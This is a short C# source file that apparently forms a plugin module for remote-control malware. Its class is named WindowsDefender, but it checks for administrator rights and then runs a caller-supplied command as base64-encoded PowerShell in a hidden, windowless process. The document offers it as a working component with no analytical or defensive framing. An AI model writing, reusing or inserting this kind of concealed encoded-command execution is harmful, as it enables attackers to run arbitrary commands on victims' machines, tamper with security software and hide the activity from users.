using System;
using System.Diagnostics;
using System.Security.Principal;
using System.Text;

namespace Plugin;

public class WindowsDefender
{
	public static void Run(string args)
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			string text = Convert.ToBase64String(Encoding.Unicode.GetBytes(args));
			RunPS("-enc " + text);
		}
	}

	private static void RunPS(string args)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = args,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		process.Start();
	}
}
